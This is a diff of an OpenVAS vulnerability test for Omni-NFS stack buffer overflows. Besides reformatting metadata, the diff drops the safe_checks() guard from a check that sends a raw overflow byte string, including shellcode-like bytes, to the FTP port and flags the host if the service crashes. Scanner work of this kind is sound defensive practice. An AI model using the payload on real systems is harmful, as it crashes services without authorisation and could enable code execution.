@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: Omni_NFS_36608.nasl 9350 2018-04-06 07:03:33Z cfischer $
+# $Id: Omni_NFS_36608.nasl 13210 2019-01-22 09:14:04Z cfischer $
 #
 # Omni-NFS Multiple Stack Buffer Overflow Vulnerabilities
 #
@@ -24,58 +24,53 @@
 # Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
 ###############################################################################
 
-tag_summary = "Omni-NFS is prone to multiple stack-based buffer-overflow
-vulnerabilities because the application fails to properly bounds-check
-user-supplied network data before copying it into an insufficiently
-sized memory buffer. The issues affect both server and client.
-
-Exploiting these issues allows attackers to execute arbitrary machine
-code in the context of users running the affected application. Failed
-attempts will likely crash the application, resulting in denial-of-
-service conditions.
-
-Omni-NFS 5.2 is vulnerable; other versions may also be affected.";
-
-
-if (description)
+if(description)
 {
- script_oid("1.3.6.1.4.1.25623.1.0.100297");
- script_version("$Revision: 9350 $");
- script_tag(name:"last_modification", value:"$Date: 2018-04-06 09:03:33 +0200 (Fri, 06 Apr 2018) $");
- script_tag(name:"creation_date", value:"2009-10-08 20:03:34 +0200 (Thu, 08 Oct 2009)");
- script_bugtraq_id(36608);
- script_tag(name:"cvss_base", value:"7.5");
- script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
+  script_oid("1.3.6.1.4.1.25623.1.0.100297");
+  script_version("$Revision: 13210 $");
+  script_tag(name:"last_modification", value:"$Date: 2019-01-22 10:14:04 +0100 (Tue, 22 Jan 2019) $");
+  script_tag(name:"creation_date", value:"2009-10-08 20:03:34 +0200 (Thu, 08 Oct 2009)");
+  script_bugtraq_id(36608);
+  script_tag(name:"cvss_base", value:"7.5");
+  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
+  script_name("Omni-NFS Multiple Stack Buffer Overflow Vulnerabilities");
+  script_tag(name:"qod_type", value:"remote_vul");
+  script_category(ACT_DENIAL);
+  script_family("Buffer overflow");
+  script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
+  script_dependencies("ftpserver_detect_type_nd_version.nasl");
+  script_require_ports("Services/ftp", 21);
+  script_mandatory_keys("ftp_banner/available");
 
- script_name("Omni-NFS Multiple Stack Buffer Overflow Vulnerabilities");
+  script_tag(name:"summary", value:"Omni-NFS is prone to multiple stack-based buffer-overflow
+  vulnerabilities because the application fails to properly bounds-check user-supplied network
+  data before copying it into an insufficiently sized memory buffer. The issues affect both server and client.");
 
+  script_tag(name:"impact", value:"Exploiting these issues allows attackers to execute arbitrary machine
+  code in the context of users running the affected application. Failed attempts will likely crash the
+  application, resulting in denial-of-service conditions.");
 
- script_tag(name:"qod_type", value:"remote_vul");
- script_category(ACT_DENIAL);
- script_family("Buffer overflow");
- script_copyright("This script is Copyright (C) 2009 Greenbone Networks GmbH");
- script_dependencies("find_service.nasl","secpod_ftp_anonymous.nasl","ftpserver_detect_type_nd_version.nasl");
- script_require_ports("Services/ftp", 21);
- script_tag(name : "summary" , value : tag_summary);
- script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/36608");
- script_xref(name : "URL" , value : "http://www.xlink.com/nfs_products/NFS_Server/NFS_Server.htm");
- exit(0);
+  script_tag(name:"affected", value:"Omni-NFS 5.2 is vulnerable. Other versions may also be affected.");
+
+  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/36608");
+  script_xref(name:"URL", value:"http://www.xlink.com/nfs_products/NFS_Server/NFS_Server.htm");
+
+  script_tag(name:"solution_type", value:"WillNotFix");
+
+  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
+  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
+  release, disable respective features, remove the product or replace the product by another one.");
+
+  exit(0);
 }
 
 include("misc_func.inc");
 include("ftp_func.inc");
 
-if(safe_checks())exit(0);
-
-port = get_kb_item("Services/ftp");
-if(!port)port = 21;
-
-if(get_kb_item('ftp/'+port+'/broken'))exit(0);
-if(!get_port_state(port))exit(0);
-
+port = get_ftp_port(default:21);
 banner = get_ftp_banner(port:port);
 
-if("XLINK" >!< banner)exit(0);
+if(!banner || "XLINK" >!< banner)exit(0);
 
 soc = open_sock_tcp(port);
 if(!soc)exit(0);
@@ -99,7 +94,7 @@ req = raw_string(0x4e,0x40,0x96,0xb5,0x46,0x89,0xe3,0x4a,0x1c,0xb1,0x98,0x2c,0xb
 0xff,0x44,0x31,0xc9,0xbe,0x1c,0x89,0xb0,0x67,0xdb,0xda,0xd9,0x74,0x24,0xf4,0xb1,
 0x02,0x58,0x31,0x70,0x13,0x83,0xc0,0x04,0x03,0x70,0x0f,0xe2,0xe9,0x08,0x74,0x33,
 0xe3,0xf4,0x8a,0x70,0x9c,0xf0,0x01,0x10) + crapdata + raw_string(0x0d,0x0a);
-		  
+
 send(socket:soc, data:req);
 close(soc);
 
@@ -107,18 +102,16 @@ sleep(10);
 
 soc1 = open_sock_tcp(port);
 if(!soc1) {
- security_message(port:port);
- exit(0);
-
+  security_message(port:port);
+  exit(0);
 } else {
-
   for(i=0;i<5;i++) {
-     if(!ftp_recv_line(socket:soc1)) {
-       security_message(port:port);
-       close(soc1);
-       exit(0);
-     }
- }
+    if(!ftp_recv_line(socket:soc1)) {
+      security_message(port:port);
+      close(soc1);
+      exit(0);
+    }
+  }
 }
 
-exit(0);
+exit(99);
